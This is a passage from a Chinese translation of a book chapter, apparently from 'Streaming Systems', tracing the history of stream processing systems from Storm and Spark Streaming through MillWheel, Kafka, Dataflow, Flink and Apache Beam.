产品给人引入高级管道概念，这使得能够让用户编写清晰易懂且自动优化的分布式大数据处理逻辑，从而让创建更大型更复杂的分布式大数据任务成为了可能，Flume 让我们业务代码在保持代码清晰逻辑干净的同时，自动具备编译器优化能力。</p><h3 id="strom"><a href="#strom" class="headerlink" title="strom"></a>strom</h3><p>接下来是 Apache Storm（图 10-15），这是我们研究的第一个真正的流式系统。 Storm 肯定不是业界使用最早的流式处理系统，但我认为这是整个行业真正广泛采用的第一个流式处理系统，因此我们在这里需要仔细研究一下。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79kbcyqj20u00dwglt.jpg" alt></p><p>Storm 是 Nathan Marz 的心血结晶，Nathan Marz 后来在一篇题为《History of Apache Storm and lessons learned》的博客文章（<a href="http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/history-of-apache-storm-and-lessons-learned.html）</a> 中记录了其创作历史（图 10-16）。 这篇冗长的博客讲述了 BackType 这家创业公司一直在自己通过消息队列和自定义代码去处理 Twitter 信息流。Nathan 和十几年前 Google 里面设计 MapReduce 相关工程师有相同的认识：实际的业务处理的代码仅仅是系统代码很小一部分，如果有个统一的流式实时处理框架负责处理各类分布式系统底层问题，那么基于之上构建我们的实时大数据处理将会轻松得多。基于此，Nathan 团队完成了 Storm 的设计和开发。</p><p>值得一提的是，Storm 的设计原则和其他系统大相径庭，Storm 更多考虑到实时流计算的处理时延而非数据的一致性保证。后者是其他大数据系统必备基础产品特征之一。Storm 针对每条流式数据进行计算处理，并提供至多一次或者至少一次的语义保证；同时不提供任何状态存储能力。相比于 Batch 批处理系统能够提供一致性语义保证，Storm 系统能够提供更低的数据处理延迟。对于某些数据处理业务场景来说，这确实也是一个非常合理的取舍。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79pvt78j20u00jt75d.jpg" alt></p><p>不幸的是，人们很快就清楚地知道他们想要什么样的流式处理系统。他们不仅希望快速得到业务结果，同时希望系统具有低延迟和准确性，但仅凭 Storm 架构实际上不可能做到这一点。针对这个情况，Nathan 后面又提出了 Lambda 架构。</p><p>鉴于 Storm 的局限性，聪明的工程师结合弱一致语义的 Storm 流处理以及强一致语义的 Hadoop 批处理。前者产生了低延迟，但不精确的结果，而后者产生了高延迟，但精确的结果，双剑合璧，整合两套系统整体提供的低延迟但最终一致的输出结果。我们在第 1 章中了解到，Lambda 架构是 Marz 的另一个创意，详见他的文章《“如何击败 CAP 定理”》（<a href="http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）" target="_blank" rel="noopener">http://nathanmarz.com/blog/how-to-beat-the-cap-theorem.html）</a> （图 10-17）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h79w7p4ej20u00oj0ve.jpg" alt></p><p>我已经花了相当多的时间来分析 Lambda 架构的缺点，以至于我不会在这里啰嗦这些问题。但我要重申一下：尽管它带来了大量成本问题，Lambda 架构当前还是非常受欢迎，仅仅是因为它满足了许多企业一个关键需求：系统提供低延迟但不准确的数据，后续通过批处理系统纠正之前数据，最终给出一致性的结果。从流处理系统演变的角度来看，Storm 确实为普罗大众带来低延迟的流式实时数据处理能力。然而，它是以牺牲数据强一致性为代价的，这反过来又带来了 Lambda 架构的兴起，导致接下来多年基于两套系统架构之上的数据处理带来无尽的麻烦和成本。</p><p>撇开其他问题先不说，Storm 是行业首次大规模尝试低延迟数据处理的系统，其影响反映在当前线上大量部署和应用各类流式处理系统。在我们要放下 Storm 开始聊其他系统之前，我觉得还是很有必要去说说 Heron 这个系统。在 2015 年，Twitter 作为 Storm 项目孵化公司以及世界上已知最大的 Storm 用户，突然宣布放弃 Storm 引擎，宣称正在研发另外一套称之为 Heron 的流式处理框架。Heron 旨在解决困扰 Storm 的一系列性能和维护问题，同时向 Storm 保持 API 兼容，详见题为《Twitter Heron：Stream Processing at scale》的论文（<a href="https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）" target="_blank" rel="noopener">https://www.semanticscholar.org/paper/Twitter-Heron%3A-Stream-Processing-at-Scale-Kulkarni-Bhagat/e847c3ec130da57328db79a7fea794b07dbccdd9）</a> （图 10-18）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7a341dvj20u00mtjv0.jpg" alt></p><p>Heron 本身也是开源产品（但开源不在 Apache 项目中）。鉴于 Storm 仍然在社区中持续发展，现在又冒出一套和 Storm 竞争的软件，最终两边系统鹿死谁手，我们只能拭目以待了。</p><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><p>继续走起，我们现在来到 Apache Spark（图 10-19）。再次，我又将大量简化 Spark 系统对行业的总体影响探讨，仅仅关注我们的流处理领域部分。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aed762j20u00dwq35.jpg" alt></p><p>Spark 在 2009 年左右诞生于加州大学伯克利分校的著名 AMPLab。最初推动 Spark 成名的原因是它能够经常在内存执行大量的计算工作，直到作业的最后一步才写入磁盘。工程师通过弹性分布式数据集（RDD）理念实现了这一目标，在底层 Pipeline 中能够获取每个阶段数据结果的所有派生关系，并且允许在机器故障时根据需要重新计算中间结果，当然，这些都基于一些假设 a）输入是总是可重放的，b）计算是确定性的。对于许多案例来说，这些先决条件是真实的，或者看上去足够真实，至少用户确实在 Spark 享受到了巨大的性能提升。从那时起，Spark 逐渐建立起其作为 Hadoop 事实上的继任产品定位。</p><p>在 Spark 创建几年后，当时 AMPLab 的研究生 Tathagata Das 开始意识到：嘿，我们有这个快速的批处理引擎，如果我们将多个批次的任务串接起来，用它能否来处理流数据？于是乎，Spark Streaming 诞生了。</p><p>关于 Spark Streaming 的真正精彩之处在于：强大的批处理引擎解决了太多底层麻烦的问题，如果基于此构建流式处理引擎则整个流处理系统将简单很多，于是世界又多一个流处理引擎，而且是可以独自提供一致性语义保障的流式处理系统。换句话说，给定正确的用例，你可以不用 Lambda 架构系统直接使用 Spark Streaming 即可满足数据一致性需求。为 Spark Streaming 手工点赞！</p><p>这里的一个主要问题是“正确的用例”部分。早期版本的 Spark Streaming（1.x 版本）的一大缺点是它仅支持特定的流处理语义：即，处理时间窗口。因此，任何需要使用事件时间，需要处理延迟数据等等案例都无法让用户使用 Spark 开箱即用解决业务。这意味着 Spark Streaming 最适合于有序数据或事件时间无关的计算。而且，正如我在本书中重申的那样，在处理当今常见的大规模、以用户为中心的数据集时，这些先决条件看上去并不是那么常见。</p><p>围绕 Spark Streaming 的另一个有趣的争议是“microbatch 和 true streaming”争论。由于 Spark Streaming 建立在批处理引擎的重复运行的基础之上，因此批评者声称 Spark Streaming 不是真正的流式引擎，因为整个系统的处理基于全局的数据切分规则。这个或多或少是实情。尽管流处理引擎几乎总是为了吞吐量而使用某种批处理或者类似的加大吞吐的系统策略，但它们可以灵活地在更精细的级别上进行处理，一直可以细化到某个 key。但基于微批处理模型的系统在基于全局切分方式处理数据包，这意味着同时具备低延迟和高吞吐是不可能的。确实我们看到许多基准测试表明这说法或多或少有点正确。当然，作业能够做到几分钟或几秒钟的延迟已经相当不错了，实际上生产中很少有用例需要严格数据正确性和低延迟保证。所以从某种意义上说，Spark 瞄准最初目标客户群体打法是非常到位的，因为大多数业务场景均属于这一类。但这并未阻止其竞争对手将此作为该平台的巨大劣势。就个人而言，在大多数情况下，我认为这只是一个很小问题。</p><p>撇开缺点不说，Spark Streaming 是流处理的分水岭：第一个广泛使用的大规模流处理引擎，它也可以提供批处理系统的正确性保证。 当然，正如前面提到的，流式系统只是 Spark 整体成功故事的一小部分，Spark 在迭代处理和机器学习领域做出了重要贡献，其原生 SQL 集成以及上述快如闪电般的内存计算，都是非常值得大书特书的产品特性。</p><p>如果您想了解有关原始 Spark 1.x 架构细节的更多信息，我强烈推荐 Matei Zaharia 关于该主题的论文《 “An Architecture for Fast and General Data Processing on Large Clusters》（图 10-20）。 这是 113 页的 Spark 核心讲解论文，非常值得一读。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7aler0xj20u00srwi6.jpg" alt></p><p>时至今日，Spark 的 2.x 版本极大地扩展了 Spark Streaming 的语义功能，其中已经包含了本书中描述流式处理模型的许多部分，同时试图简化一些更复杂的设计。 Spark 甚至推出了一种全新的、真正面向流式处理的架构，用以规避掉微批架构的种种问题。但是曾经，当 Spark 第一次出现时，它带来的重要贡献是它是第一个公开可用的流处理引擎，具有数据处理的强一致性语义，尽管这个特性只能用在有序数据或使用处理时间计算的场景。</p><h3 id="MillWheel"><a href="#MillWheel" class="headerlink" title="MillWheel"></a>MillWheel</h3><p>接下来我们讨论 MillWheel，这是我在 2008 年加入 Google 后的花 20％时间兼职参与的项目，后来在 2010 年全职加入该团队（图 10-21）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7bomue7j20u00dwt8x.jpg" alt></p><p>MillWheel 是 Google 最早的通用流处理架构，该项目由 Paul Nordstrom 在 Google 西雅图办事处开业时发起。 MillWheel 在 Google 内的成功与长期以来一直致力于为无序数据提供低延迟，强一致的处理能力不无关系。在本书的讲解中，我们已经多次分别讨论了促使 MillWheel 成为一款成功产品的方方面面。</p><ul><li>第五章，Reuven 详细讨论过数据精准一次的语义保证。精准一次的语义保证对于正确性至关重要。</li><li>第七章，我们研究了状态持久化，这为在不那么靠谱的普通硬件上执行的长时间数据处理业务并且需要保证正确性奠定了基础。</li><li>第三章，Slava 讨论了 Watermark。Watermark 为处理无序数据提供了基础。</li><li>第七章，我们研究了持久性计时器，它们提供了 Watermark 与业务逻辑之间的某些关联特性。</li></ul><p>有点令人惊讶的是，MillWheel 项目最开始并未关注数据正确性。保罗最初的想法更接近于 Storm 的设计理论：具有弱一致性的低延迟数据处理。这是最初的 MillWheel 客户，一个关于基于用户搜索数据构建会话和另一个对搜索查询执行异常检测（来自 MillWheel 论文的 Zeitgeist 示例），这两家客户迫使项目走向了正确的方向。两者都非常需要强一致的数据结果：会话用于推断用户行为，异常检测用于推断搜索查询的趋势 ; 如果他们提供的数据不靠谱，两者效果都会显着下降。最终，幸运的是，MillWheel 的设计被客户需求导向追求数据强一致性的结果。</p><p>支持乱序数据处理，这是现代流式处理系统的另一个核心功能。这个核心功能通常也被认为是被 MillWheel 引入到流式处理领域，和数据准确性一样，这个功能也是被客户需求推动最终加入到我们系统。 Zeitgeist 项目的大数据处理过程，通常被我们拿来用作一个真正的流式处理案例来讨论。Zeitgeist 项目希望检测识别搜索查询流量中的异常，并且需要捕获异常流量。对于这个大数据项目数据消费者来说，流计算将所有计算结果产出并让用户轮询所有 key 用来识别异常显然不太现实，数据用户要求系统直接计算某个 key 出现异常的数据结果，而不需要上层再来轮询。对于异常峰值（即查询流量的增加），这还相对来说比较简单好解决：当给定查询的计数超过查询的预期值时，系统发出异常信号。但是对于异常下降（即查询流量减少），问题有点棘手。仅仅看到给定搜索词的查询数量减少是不够的，因为在任何时间段内，计算结果总是从零开始。在这些情况下你必须确保你的数据输入真的能够代表当前这段时间真实业务流量，然后才将计算结果和预设模型进行比较。</p><blockquote><p><strong>真正的流式处理</strong></p></blockquote><blockquote><p>“真正的流式处理用例”需要一些额外解释。流式系统的一个新的演化趋势是，舍弃掉部分产品需求以简化编程模型，从而使整个系统简单易用。例如，在撰写本文时，Spark Structured Streaming 和 Apache Kafka Streams 都将系统提供的功能限制在第 8 章中称为“物化视图语义”范围内，本质上对最终一致性的输出表不停做数据更新。当您想要将上述输出表作为结果查询使用时，物化视图语义非常匹配你的需求：任何时候我们只需查找该表中的值并且 (译者注: 尽管结果数据一直在不停被更新和改变) 以当前查询时间请求到查询结果就是最新的结果。但在一些需要真正流式处理的场景，例如异常检测，上述物化视图并不能够很好地解决这类问题。</p></blockquote><blockquote><p>接下来我们会讨论到，异常检测的某些需求使其不适合纯物化视图语义（即，依次针对单条记录处理），特别当需要完整的数据集才能够识别业务异常，而这些异常恰好是由于数据的缺失或者不完整导致的。另外，不停轮询结果表以查看是否有异常其实并不是一个扩展性很好的办法。真正的流式用户场景是推动 watermark 等功能的原始需求来源。(Watermark 所代表的时间有先有后，我们需要最低的 Watermark 追踪数据的完整性，而最高的 Watermark 在数据时间发生倾斜时候非常容易导致丢数据的情况发生，类似 Spark Structured Streaming 的用法)。省略类似 Watermark 等功能的系统看上去简单不少，但换来代价是功能受限。在很多情况下，这些功能实际上有非常重要的业务价值。但如果这样的系统声称这些简化的功能会带来系统更多的普适性，不要听他们忽悠。试问一句，功能需求大量被砍掉，如何保证系统的普适性呢？</p></blockquote><p>Zeitgeist 项目首先尝试通过在计算逻辑之前插入处理时间的延迟数值来解决数据延迟问题。当数据按顺序到达时，这个思路处理逻辑正常。但业务人员随后发现数据有时可能会延迟很大，从而导致数据无序进入流式处理系统。一旦出现这个情况，系统仅仅采用处理时间的延迟是不够的，因为底层数据处理会因为数据乱序原因被错误判断为异常。最终，我们需要一种等待数据到齐的机制。</p><p>之后 Watermark 被设计出来用以解决数据乱序的问题。正如 Slava 在第 3 章中所描述的那样，基本思想是跟踪系统输入数据的当前进度，对于每个给定的数据源，构建一个数据输入进度用来表征输入数据的完整性。对于一些简单的数据源，例如一个带分区的 Kafka Topic，每个 Topic 下属的分区被写入的是业务时间持续递增的数据（例如通过 Web 前端实时记录的日志事件），这种情况下我们可以计算产生一个非常完美的 Watermark。但对于一些非常复杂的数据输入，例如动态的输入日志集，一个启发式算法可能是我们能够设计出来最能解决业务问题的 Watermark 生成算法了。但无论哪种方式，Watermark 都是解决输入事件完整性最佳方式。之前我们尝试使用处理时间来解决事件输入完整性，有点驴头不及马嘴的感觉。</p><p>得益于客户的需求推动，MillWheel 最终成为能够支持无序数据的强大流处理引擎。因此，题为《MillWheel: Fault-Tolerant Stream Processing at Internet Scale》（图 10-22）的论文花费大部分时间来讨论在这样的系统中提供正确性的各种问题，一致性保证、Watermark。如果您对这个主题感兴趣，那值得花时间去读读这篇论文。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7c6d50hj20u00jrdix.jpg" alt></p><p>MillWheel 论文发表后不久，MillWheel 就成为 Flume 底层提供支撑的流式处理引擎，我们称之为 Streaming Flume。今天在谷歌内部，MillWheel 被下一代理论更为领先的系统所替换: Windmill（这套系统同时也为 DataFlow 提供了执行引擎），这是一套基于 MillWheel 之上，博采众家之长的大数据处理系统，包括提供更好的调度和分发策略、更清晰的框架和业务代码解耦。</p><p>MillWheel 给我们带来最大的价值是之前列出的四个概念（数据精确一次性处理，持久化的状态存储，Watermark，持久定时器）为流式计算提供了工业级生产保障：即使在不可靠的商用硬件上，也可以对无序数据进行稳定的、低延迟的处理。</p><h3 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h3><p>我们开始讨论 Kafka（图 10-23）。 Kafka 在本章讨论的系统中是独一无二的，因为它不是数据计算框架，而是数据传输和存储的工具。但是，毫无疑问，Kafka 在我们正在讨论的所有系统中扮演了推动流处理的最有影响力的角色之一。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7citnfkj20u00dwt8x.jpg" alt></p><p>如果你不熟悉它，我们可以简单描述为: Kafka 本质上是一个持久的流式数据传输和存储工具，底层系统实现为一组带有分区结构的日志型存储。它最初是由 Neha Narkhede 和 Jay Kreps 等业界大牛在 LinkedIn 公司内部开发的，其卓越的特性有:</p><ul><li>提供一个干净的持久性模型，让大家在流式处理领域里面可以享受到批处理的产品特性，例如持久化、可重放。</li><li>在生产者和消费者之间提供弹性隔离。</li><li>我们在第 6 章中讨论过的流和表之间的关系，揭示了思考数据处理的基本方式，同时还提供了和数据库打通的思路和概念。</li><li>来自于上述所有方面的影响，不仅让 Kafka 成为整个行业中大多数流处理系统的基础，而且还促进了流处理数据库和微服务运动。</li></ul><p>在这些特性中，有两个对我来说最为突出。第一个是流数据的持久化和可重放性的应用。在 Kafka 之前，大多数流处理系统使用某种临时、短暂的消息系统，如 Rabbit MQ 甚至是普通的 TCP 套接字来发送数据。数据处理的一致性往往通过生产者数据冗余备份来实现（即，如果下游数据消费者出现故障，则上游生产者将数据进行重新发送），但是上游数据的备份通常也是临时保存一下。大多数系统设计完全忽略在开发和测试中需要重新拉取数据重新计算的需求。但 Kafka 的出现改变了这一切。从数据库持久日志概念得到启发并将其应用于流处理领域，Kafka 让我们享受到了如同 Batch 数据源一样的安全性和可靠性。凭借持久化和可重放的特点，流计算在健壮性和可靠性上面又迈出关键的一步，为后续替代批处理系统打下基础。</p><p>作为一个流式系统开发人员，Kafka 的持久化和可重放功能对业界产生一个更有意思的变化就是: 当今大量流处理引擎依赖源头数据可重放来提供端到端精确一次的计算保障。可重放的特点是 Apex，Flink，Kafka Streams，Spark 和 Storm 的端到端精确一次保证的基础。当以精确一次模式执行时，每个系统都假设 / 要求输入数据源能够重放之前的部分数据 (从最近 Checkpoint 到故障发生时的数据)。当流式处理系统与不具备重放能力的输入源一起使用时（哪怕是源头数据能够保证可靠的一致性数据投递，但不能提供重放功能），这种情况下无法保证端到端的完全一次语义。这种对可重放（以及持久化等其他特点）的广泛依赖是 Kafka 在整个行业中产生巨大影响的间接证明。</p><p>Kafka 系统中第二个值得注意的重点是流和表理论的普及。我们花了整个第 6 章以及第 8 章、第 9 章来讨论流和表，可以说流和表构成了数据处理的基础，无论是 MapReduce 及其演化系统，SQL 数据库系统，还是其他分支的数据处理系统。并不是所有的数据处理方法都直接基于流或者表来进行抽象，但从概念或者理论上说，表和流的理论就是这些系统的运作方式。作为这些系统的用户和开发人员，理解我们所有系统构建的核心基础概念意义重大。我们都非常感谢 Kafka 社区的开发者，他们帮助我们更广泛更加深入地了解到批流理论。</p><p>如果您想了解更多关于 Kafka 及其理论核心，JackKreps 的《I❤Logs》（O’Reilly; 图 10-24）是一个很好的学习资料。另外，正如第 6 章中引用的那样，Kreps 和 Martin Kleppmann 有两篇文章（图 10-25），我强烈建议您阅读一下关于流和表相关理论。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cqke9dj20dw0i80tf.jpg" alt></p><p>Kafka 为流处理领域做出了巨大贡献，可以说比其他任何单一系统都要多。特别是，对输入和输出流的持久性和可重放的设计，帮助将流计算从近似工具的小众领域发展到在大数据领域妇孺皆知的程度起了很大作用。此外，Kafka 社区推广的流和表理论对于数据处理引发了我们深入思考。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7cwnv5vj20u00clq3j.jpg" alt></p><h3 id="DataFlow"><a href="#DataFlow" class="headerlink" title="DataFlow"></a>DataFlow</h3><p>Cloud Dataflow（图 10-26）是 Google 完全托管的、基于云架构的数据处理服务。 Dataflow 于 2015 年 8 月推向全球。DataFlow 将 MapReduce，Flume 和 MillWheel 的十多年经验融入其中，并将其打包成 Serverless 的云体验。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7d644kqj20u00qe0xe.jpg" alt></p><p>虽然 Google 的 Dataflow 的 Serverless 特点可能是从系统角度来看最具技术挑战性以及有别于其他云厂商产品的重要因素，但我想在此讨论主要是其批流统一的编程模型。编程模型包括我们在本书的大部分内容中所讨论的转换，窗口，水印，触发器和聚合计算。当然，所有这些讨论都包含了思考问题的 what、where、when、how。</p><p>DataFlow 模型首先诞生于 Flume，因为我们希望将 MillWheel 中强大的无序数据计算能力整合到 Flume 提供的更高级别的编程模型中。这个方式可以让 Google 员工在内部使用 Flume 进行统一的批处理和流处理编程。</p><p>关于统一模型的核心关键思考在于，尽管在当时我们也没有深刻意识到，批流处理模型本质上没有区别: 仅仅是在表和流的处理上有些小变化而已。正如我们在第 6 章中所讨论到的，主要的区别仅仅是在将表上增量的变化转换为流，其他一切在概念上是相同的。通过利用批处理和流处理两者大量的共性需求，可以提供一套引擎，适配于两套不同处理方式，这让流计算系统更加易于使用。</p><p>除了利用批处理和流处理之间的系统共性之外，我们还仔细查看了多年来我们在 Google 中遇到的各种案例，并使用这些案例来研究统一模型下系统各个部分。我们研究主要内容如下：</p><ul><li>未对齐的事件时间窗口（如会话窗口），能够简明地表达这类复杂的分析，同时亦能处理乱序数据。</li><li>自定义窗口支持，系统内置窗口很少适合所有业务场景，需要提供给用户自定义窗口的能力。</li><li>灵活的触发和统计模式，能够满足正确性，延迟，成本的各项业务需求。</li><li>使用 Watermark 来推断输入数据的完整性，这对于异常检测等用例至关重要，其中异常检测逻辑会根据是否缺少数据做出异常判断。</li><li>底层执行环境的逻辑抽象，无论是批处理，微批处理还是流式处理，都可以在执行引擎中提供灵活的选择，并避免系统级别的参数设置（例如微批量大小）进入逻辑 API。</li></ul><p>总之，这些平衡了灵活性，正确性，延迟和成本之间的关系，将 DataFlow 的模型应用于大量用户业务案例之中。</p><p>考虑到我们之前整本书都在讨论 DataFlow 和 Beam 模型的各类问题，我在此处重新给大家讲述这些概念纯属多此一举。但是，如果你正在寻找稍微更具学术性的内容以及一些应用案例，我推荐你看下 2015 年发表的《DataFlow 论文..》（图 10-27）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7dd2y3uj20u00qe0xe.jpg" alt></p><p>DataFlow 还有不少可以大书特书的功能特点，但在这章内容构成来看，我认为 DataFlow 最重要的是构建了一套批流统一的大数据处理模型。DataFlow 为我们提供了一套全面的处理无界且无序数据集的能力，同时这套系统很好的平衡了正确性、延迟、成本之间的相互关系。</p><h3 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h3><p>Flink（图 10-28）在 2015 年突然出现在大数据舞台，然后似乎在一夜之间从一个无人所知的系统迅速转变为人人皆知的流式处理引擎。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7doer6ij20u00dwaaa.jpg" alt></p><p>在我看来，Flink 崛起有两个主要原因：</p><ul><li>采用 Dataflow/Beam 编程模型，使其成为完备语义功能的开源流式处理系统。</li><li>其高效的快照实现方式，源自 Chandy 和 Lamport 的原始论文《“Distributed Snapshots: Determining Global States of Distributed Systems”》的研究，这为其提供了正确性所需的强一致性保证。</li></ul><p>Reuven 在第 5 章中简要介绍了 Flink 的一致性机制，这里在重申一下，其基本思想是在系统中的 Worker 之间沿着数据传播路径上产生周期性 Barrier。这些 Barrier 充当了在不同 Worker 之间传输数据时的对齐机制。当一个 Worker 在其所有上游算子输入来源（即来自其所有上游一层的 Worker）上接收到全部 Barrier 时，Worker 会将当前所有 key 对应的状态写入一个持久化存储。这个过程意味着将这个 Barrier 之前的所有数据都做了持久化。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7du1knjj20u00qbwha.jpg" alt></p><p>通过调整 Barrier 的生成频率，可以间接调整 Checkpoint 的执行频率，从而降低时延并最终获取更高的吞吐（其原因是做 Checkpoint 过程中涉及到对外进行持久化数据，因此会有一定的 IO 导致延时）。</p><p>Flink 既能够支持精确一次的语义处理保证，同时又能够提供支持事件时间的处理能力，这让 Flink 获取的巨大的成功。接着， Jamie Grier 发表他的题为“《Extending the Yahoo! Streaming Benchmark》“（图 10-30）的文章，文章中描述了 Flink 性能具体的测试数据。在那篇文章中，杰米描述了两个令人印象深刻的特点：</p><ol><li><p>构建一个用于测试的 Flink 数据管道，其拥有比 Twitter Storm 更高的准确性（归功于 Flink 的强一次性语义），但成本却降到了 1％。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7e1vjk5j20u00wwq5v.jpg" alt></p><ol start="2"><li><p>Flink 在精确一次的处理语义参数设定下，仍然达到 Storm 的 7.5 倍吞吐量（而且，Storm 还不具备精确一次的处理语义）。此外，由于网络被打满导致 Flink 的性能受到限制 ; 进一步消除网络瓶颈后 Flink 的吞吐量几乎达到 Storm 的 40 倍。</p><p>从那时起，许多其他流式处理项目（特别是 Storm 和 Apex）都采用了类似算法的数据处理一致性机制。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ec9lylj20u00vk0u6.jpg" alt></p><p>通过快照机制，Flink 获得了端到端数据一致性。Flink 更进了一步，利用其快照的全局特性，提供了从过去的任何一点重启整个管道的能力，这一功能称为 SavePoint（在 Fabian Hueske 和 Michael Winters 的帖子 [《Savepoints: Turning Back Time》(<a href="https://data-artisans.com/blog/turning-back-time-savepoints)]" target="_blank" rel="noopener">https://data-artisans.com/blog/turning-back-time-savepoints)]</a> 中有所描述，[图 10-31]）。Savepoints 功能参考了 Kafka 应用于流式传输层的持久化和可重放特性，并将其扩展应用到整个底层 Pipeline。流式处理仍然遗留大量开放性问题有待优化和提升，但 Flink 的 Savepoints 功能是朝着正确方向迈出的第一步，也是整个行业非常有特点的一步。 如果您有兴趣了解有关 Flink 快照和保存点的系统构造的更多信息，请参阅《State Management in Apache Flink》（图 10-32），论文详细讨论了相关的实现。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7ein1n1j20u00qstdj.jpg" alt></p><p>除了保存点之外，Flink 社区还在不断创新，包括将第一个实用流式 SQL API 推向大规模分布式流处理引擎的领域，正如我们在第 8 章中所讨论的那样。 总之，Flink 的迅速崛起成为流计算领军角色主要归功于三个特点：</p><ol><li>整合行业里面现有的最佳想法（例如，成为第一个开源 DataFlow/Beam 模型）</li><li>创新性在表上做了大量优化，并将状态管理发挥更大价值，例如基于 Snapshot 的强一致性语义保证，Savepoints 以及流式 SQL。</li><li>迅速且持续地推动上述需求落地。</li></ol><p>另外，所有这些改进都是在开源社区中完成的，我们可以看到为什么 Flink 一直在不断提高整个行业的流计算处理标准。</p><h3 id="Beam"><a href="#Beam" class="headerlink" title="Beam"></a>Beam</h3><p>我们今天谈到的最后一个系统是 Apache Beam（图 10-33）。 Beam 与本章中的大多数其他系统的不同之处在于，它主要是编程模型，API 设计和可移植层，而不是带有执行引擎的完整系统栈。但这正是我想强调的重点：正如 SQL 作为声明性数据处理的通用语言一样，Beam 的目标是成为程序化数据处理的通用语言。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7evt7rkj20u00dw3yq.jpg" alt></p><p>具体而言，Beam 由许多组件组成：</p><ul><li>一个统一的批量加流式编程模型，继承自 Google DataFlow 产品设计，以及我们在本书的大部分内容中讨论的细节。该模型独立于任何语言实现或 runtime 系统。您可以将此视为 Beam 等同于描述关系代数模型的 SQL。</li><li>一组实现该模型的 SDK（软件开发工具包），允许底层的 Pipeline 以不同 API 语言的惯用方式编排数据处理模型。 Beam 目前提供 Java，Python 和 Go 的 SDK，可以将它们视为 Beam 的 SQL 语言本身的程序化等价物。</li><li>一组基于 SDK 的 DSL（特定于域的语言），提供专门的接口，以独特的方式描述模型在不同领域的接口设计。SDK 来描述上述模型处理能力的全集，但 DSL 描述一些特定领域的处理逻辑。 Beam 目前提供了一个名为 Scio 的 Scala DSL 和一个 SQL DSL，它们都位于现有 Java SDK 之上。</li><li>一组可以执行 Beam Pipeline 的执行引擎。执行引擎采用 Beam SDK 术语中描述的逻辑 Pipeline，并尽可能高效地将它们转换为可以执行的物理计划。目前，针对 Apex，Flink，Spark 和 Google Cloud Dataflow 存在对应的 Beam 引擎适配。在 SQL 术语中，您可以将这些引擎适配视为 Beam 在各种 SQL 数据库的实现，例如 Postgres，MySQL，Oracle 等。</li></ul><p>Beam 的核心愿景是实现一套可移植接口层，最引人注目的功能之一是它计划支持完整的跨语言可移植性。尽管最终目标尚未完全完成（但即将面市），让 Beam 在 SDK 和引擎适配之间提供足够高效的抽象层，从而实现 SDK 和引擎适配之间的任意切换。我们畅想的是，用 JavaScript SDK 编写的数据 Pipeline 可以在用 Haskell 编写的引擎适配层上无缝地执行，即使 Haskell 编写的引擎适配本身没有执行 JavaScript 代码的能力。</p><p>作为一个抽象层，Beam 如何定位自己和底层引擎关系，对于确保 Beam 实际为社区带来价值至关重要，我们也不希望看到 Beam 引入一个不必要的抽象层。这里的关键点是，Beam 的目标永远不仅仅是其所有底层引擎功能的交集（类似最小公分母）或超集（类似厨房水槽）。相反，它旨在为整个社区大数据计算引擎提供最佳的想法指导。这里面有两个创新的角度:</p><ul><li><strong>Beam 本身的创新</strong></li></ul><p>Beam 将会提出一些 API，这些 API 需要底层 runtime 改造支持，并非所有底层引擎最初都支持这些功能。这没关系，随着时间的推移，我们希望许多底层引擎将这些功能融入未来版本中 ; 对于那些需要这些功能的业务案例来说，具备这些功能的引擎通常会被业务方选择。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h7f2cqotj20u00l4gnr.jpg" alt></p><p>这里举一个 Beam 里面关于 SplittableDoFn 的 API 例子，这个 API 可以用来实现一个可组合的，可扩展的数据源。（具体参看 Eugene Kirpichov 在他的文章《 “Powerful and modular I/O connectors with Splittable DoFn in Apache Beam》中描述 [图 10-34]）。它设计确实很有特点且功能强大，目前我们还没有看到所有底层引擎对动态负载均衡等一些更具创新性功能进行广泛支持。然而，我们预计这些功能将随着时间的推移而持续加入底层引擎支持的范围。</p><ul><li><strong>底层引擎的创新</strong></li></ul><p>底层引擎适配可能会引入底层引擎所独特的功能，而 Beam 最初可能并未提供 API 支持。这没关系，随着时间的推移，已证明其有用性的引擎功能将在 Beam API 逐步实现。</p><p>这里的一个例子是 Flink 中的状态快照机制，或者我们之前讨论过的 Savepoints。 Flink 仍然是唯一一个以这种方式支持快照的公开流处理系统，但是 Beam 提出了一个围绕快照的 API 建议，因为我们相信数据 Pipeline 运行时优雅更新对于整个行业都至关重要。如果我们今天推出这样的 API，Flink 将是唯一支持它的底层引擎系统。但同样没关系，这里的重点是随着时间的推移，整个行业将开始迎头赶上，因为这些功能的价值会逐步为人所知。这些变化对每个人来说都是一件好事。</p><p>通过鼓励 Beam 本身以及引擎的创新，我们希望推进整个行业快速演化，而不用再接受功能妥协。 